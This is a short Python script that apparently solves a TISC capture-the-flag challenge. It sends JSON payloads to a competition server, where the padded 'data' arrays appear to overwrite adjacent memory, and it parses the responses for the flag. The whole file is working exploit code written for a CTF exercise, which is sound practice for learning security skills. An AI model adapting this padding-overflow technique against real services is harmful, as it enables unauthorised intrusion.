#!/usr/bin/env python3
import json
import socket
import time
import sys

HOST = ('chals.tisc25.ctf.sg', 51728)

PAYLOADS = [
    {"slot": 1, "data": [69, 2, 0]},
    {"slot": 1, "data": ([0] * 44) + [65, 11, 0]},
    {"slot": 1, "data": ([0] * 44) + [75, 37, 0]},
    {"slot": 0}
]

def send_lines(lines, timeout=6, sleep_between=0.2):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect(HOST)
        out = []
        for line in lines:
            data = (json.dumps(line) + '\n').encode()
            s.sendall(data)
            try:
                resp = s.recv(16384)
            except socket.timeout:
                resp = b''
            out.append(resp)
            time.sleep(sleep_between)
        return out
    finally:
        try:
            s.shutdown(socket.SHUT_RDWR)
        except Exception:
            pass
        s.close()


def decode_flag(resp: bytes):
    try:
        if b'TISC{' in resp:
            # flag printed directly
            start = resp.find(b'TISC{')
            end = resp.find(b'}', start)
            if end != -1:
                return resp[start:end+1].decode(errors='ignore')
        if b'[' in resp and b']' in resp:
            # slot prints an array of ints
            arr = resp[resp.index(b'['): resp.index(b']')+1]
            vals = json.loads(arr)
            s = ''.join(chr(x) for x in vals if isinstance(x, int) and 0 <= x < 256 and x != 0)
            if 'TISC{' in s:
                s2 = s[s.index('TISC{'):]
                if '}' in s2:
                    return s2[:s2.index('}')+1]
            return s
    except Exception:
        return None
    return None


def main():
    resps = send_lines(PAYLOADS)
    for i, r in enumerate(resps, 1):
        print(f"resp{i}: {r[:200]!r}")
    for r in resps:
        flag = decode_flag(r)
        if flag:
            print('FLAG:', flag)
            return 0
    print('No flag in single attempt.')
    return 1

if __name__ == '__main__':
    sys.exit(main())
